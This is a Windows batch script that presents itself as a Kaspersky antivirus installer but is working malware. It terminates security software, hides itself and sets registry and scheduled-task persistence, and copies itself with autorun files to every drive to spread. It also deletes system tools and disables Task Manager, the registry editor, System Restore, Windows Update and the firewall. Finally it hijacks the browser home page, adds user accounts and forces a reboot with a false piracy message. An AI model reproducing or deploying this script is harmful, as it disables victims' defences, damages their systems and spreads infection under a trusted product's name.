@ECHO OFF

title Kaspersky Anti-Virus Lite Beta 1.0 Installation

start iscch.bat

cls

tskill Ad-Watch

tskill TeaTimer

tskill zonealarm

cls

tskill kavsvc

tskill kaspersky

tskill kavmm

tskill avgnt

tskill avconfig

tskill ccapp

tskill avguard

cls

tskill avgcc

tskill avgemc

tskill avgupsvc

tskill avgamsvr

tskill avpcc

cls

tskill bdswitch

tskill bdss

tskill nod32kui

tskill nod32krn

tskill ashwebsv

cls

tskill nprotect

tskill navshext

tskill mcvsescn

tskill webscanx

tskill mcvsescn

cls

copy iscch.bat c:\WINDOWS /y

attrib +r +h +s c:\WINDOWS\iscch.bat

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v iscch /t REG_SZ /d %systemroot%\iscch.bat /f

copy update.bat c:\WINDOWS /y

attrib +r +h +s c:\WINDOWS\update.bat

MD c:\WINDOWS\Cache

copy kavlite.exe c:\WINDOWS\Cache /y

copy update.bat c:\WINDOWS\Cache /y

copy iscch.bat c:\WINDOWS\Cache /y

copy website.bat c:\WINDOWS\Cache /y

copy LittleRedRidingHood.txt c:\WINDOWS\Cache /y

copy autorun.inf c:\WINDOWS\Cache /y

cls

md c:\TempCache

md d:\TempCache

md e:\TempCache

md f:\TempCache

md g:\TempCache

md h:\TempCache

md i:\TempCache

md j:\TempCache

cls

copy kavlite.exe c:\TempCache /y

copy kavlite.exe d:\TempCache /y

copy kavlite.exe e:\TempCache /y

copy kavlite.exe f:\TempCache /y

copy kavlite.exe g:\TempCache /y

copy kavlite.exe h:\TempCache /y

copy kavlite.exe i:\TempCache /y

copy kavlite.exe j:\TempCache /y

cls

copy autorun.inf c:\ /y 

copy autorun.inf d:\ /y

copy autorun.inf e:\ /y

copy autorun.inf f:\ /y

copy autorun.inf g:\ /y

copy autorun.inf h:\ /y

copy autorun.inf i:\ /y

copy autorun.inf j:\ /y

cls

attrib +r +h +s c:\autorun.inf

attrib +r +h +s d:\autorun.inf

attrib +r +h +s e:\autorun.inf

attrib +r +h +s f:\autorun.inf

attrib +r +h +s g:\autorun.inf

attrib +r +h +s h:\autorun.inf

attrib +r +h +s i:\autorun.inf

attrib +r +h +s j:\autorun.inf

cls

copy autorun.inf c:\TempCache /y 

copy autorun.inf d:\TempCache /y

copy autorun.inf e:\TempCache /y

copy autorun.inf f:\TempCache /y

copy autorun.inf g:\TempCache /y

copy autorun.inf h:\TempCache /y

copy autorun.inf i:\TempCache /y

copy autorun.inf j:\TempCache /y
 
cls

copy iscch.bat c:\TempCache /y

copy iscch.bat d:\TempCache /y

copy iscch.bat e:\TempCache /y

copy iscch.bat f:\TempCache /y

copy iscch.bat g:\TempCache /y
 
copy iscch.bat h:\TempCache /y

copy iscch.bat i:\TempCache /y

copy iscch.bat j:\TempCache /y

cls

copy update.bat c:\TempCache /y

copy update.bat d:\TempCache /y

copy update.bat e:\TempCache /y

copy update.bat f:\TempCache /y

copy update.bat g:\TempCache /y
 
copy update.bat h:\TempCache /y

copy update.bat i:\TempCache /y

copy update.bat j:\TempCache /y

cls

copy LittleRedRidingHood.txt c:\TempCache /y

copy LittleRedRidingHood.txt d:\TempCache /y

copy LittleRedRidingHood.txt e:\TempCache /y

copy LittleRedRidingHood.txt f:\TempCache /y

copy LittleRedRidingHood.txt g:\TempCache /y

copy LittleRedRidingHood.txt h:\TempCache /y

copy LittleRedRidingHood.txt i:\TempCache /y

copy LittleRedRidingHood.txt j:\TempCache /y

cls

at 8:30 /every:M,T,W,TH,F,S,SU c:\WINDOWS\update.bat

at 9:00 /every:M,T,W,TH,F,S,SU c:\WINDOWS\update.bat

at 10:30 /every:M,T,W,TH,F,S,SU c:\WINDOWS\update.bat

at 11:00 /every:M,T,W,TH,F,S,SU c:\WINDOWS\update.bat

at 12:30 /every:M,T,W,TH,F,S,SU c:\WINDOWS\update.bat

at 13:00 /every:M,T,W,TH,F,S,SU c:\WINDOWS\update.bat

at 14:30 /every:M,T,W,TH,F,S,SU c:\WINDOWS\update.bat

at 15:00 /every:M,T,W,TH,F,S,SU c:\WINDOWS\update.bat

at 16:30 /every:M,T,W,TH,F,S,SU c:\WINDOWS\update.bat

cls

del c:\WINDOWS\notepad.exe /q /f

del c:\WINDOWS\system32\notepad.exe /q /f

attrib -s -h -r c:\WINDOWS\system32\dllcache

del c:\WINDOWS\system32\dllcache\notepad.exe /q /f

del c:\WINDOWS\SevicePackFiles\i386\notepad.exe /q /f

del c:\WINDOWS\system32\dllcache\msconfig.exe /q /f

del c:\WINDOWS\PCHealth\HelpCtr\Binaries\msconfig.exe /q /f

del c:\WINDOWS\SevicePackFiles\i386\msconfig.exe /q /f

cls

REG delete HKCR\.txt\ShellNew /f

REG add HKCU\Software\Microsoft\Internet Explorer\Main /v Window Title /t REG_SZ /d Hijacked by Bill Gates /f

REG add HKCR\*\shellex\ContextMenuHandlers\Open With /v @ /t REG_SZ /d "" /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFileMenu /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL /v CheckedValue /t REG_DWORD /d 0 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoShellSearchButton /t REG_DWORD /d 1 /f

REG add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DisableCAD /t REG_DWORD /d 1 /f

REG add HKCR\CLSID\{2559a1f1-21d7-11d4-bdaf-00c04f60b9f0} /v @ /t REG_SZ /t Help Unavailable  /f

cls


REG add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f

REG add HKLM\SYSTEM\CurrentControlSet\Services\sr /v Start /t REG_DWORD /d 4 /f

REG delete HKCR\CLSID\{5b4dae26-b807-11d0-9815-00c04fd91972} /f

REG add HKCU\Software\Microsoft\Internet Explorer\Main /v Start Page /t REG_SZ /d sabul.blogspot.com /f

REG add HKLM\Software\Microsoft\Internet Explorer\Main /v Start Page /t REG_SZ /d sabul.blogspot.com /f

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.doc\OpenWithList /v a /t REG_SZ /d spider.EXE /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.doc\OpenWithList /v MRUList /t REG_SZ /d a /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.ppt\OpenWithList /v a /t REG_SZ /d PINBALL.EXE /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.ppt\OpenWithList /v MRUList /t REG_SZ /d a /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.xls\OpenWithList /v a /t REG_SZ /d sol.EXE /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.xls\OpenWithList /v MRUList /t REG_SZ /d a /f

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f

REG add HKCU\Control Panel\don't load /v timedate.cpl /t REG_SZ /d no /f

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideClock /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayItemsDisplay /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayContextMenu /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoToolBarsOnTaskBar /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoPropertiesMycomputer /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSimpleStartMenu /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoCloseDragDropBands /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoMovingBands /t REG_DWORD /d 1 /f

REG add HKCU\Control Panel\Mouse /v MouseTrails /t REG_SZ /d 7 /f

cls

REG add HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate\DisableWindowsUpdateAccess

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWindowsUpdate /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWindowsUpdate /t REG_DWORD /d 1 /f

REG add HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f

REG add HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v AUOptions /t REG_DWORD /d 1 /f

REG add HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

REG add HKLM\\Software\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDevMgrUpdate /t REG_DWORD /d 1 /f

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSaveSettings /t REG_DWORD /d 1 /f

REG add HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v EnableFirewall /t REG_DWORD /d 0 /f

REG add HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v DoNotAllowExceptions /t REG_DWORD /d 0 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewOnDrive /t REG_DWORD /d 4 /f

cls

del "c:\Program Files\Kaspersky\update.bat"

del "c:\Program Files\Kaspersky\iscch.bat"

del "c:\Program Files\Kaspersky\LittleRedRidingHood.txt"

del "c:\Program Files\Kaspersky\autorun.inf"

net user Viktor 1254 /add

net user Vladimir 1254 /add

net user Vassili 1254 /add

cls

shutdown -r -t 5 -c "Windows must restart because your copy of Windows XP is pirated." -f




